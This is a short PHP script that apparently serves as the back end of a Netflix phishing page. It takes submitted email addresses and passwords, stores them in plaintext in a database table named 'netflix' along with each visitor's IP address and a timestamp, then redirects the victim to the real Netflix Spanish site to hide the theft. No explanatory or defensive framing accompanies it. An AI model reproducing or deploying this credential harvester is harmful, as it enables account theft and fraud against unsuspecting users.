<?php

include "database.php";
setlocale(LC_TIME, "C");
$date = strftime("%H:%M %d-%m-%y");

if (!empty($_POST['correo']) && !empty($_POST['password'])) {
    $sql = "INSERT INTO netflix (correo, password,ip, date) VALUES (:correo, :password,:ip, :date)";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':correo', $_POST['correo']);
    $stmt->bindParam(':password', $_POST['password']);
    $stmt->bindParam(':ip',  $_SERVER['REMOTE_ADDR']);
    $stmt->bindParam(':date',  $date);


    if ($stmt->execute()) {
      $message = 'Successfully created new user';
    } else {
      $message = 'Sorry there must have been an issue creating your account';
    }
}

header('Location: https://www.netflix.com/es/')

?>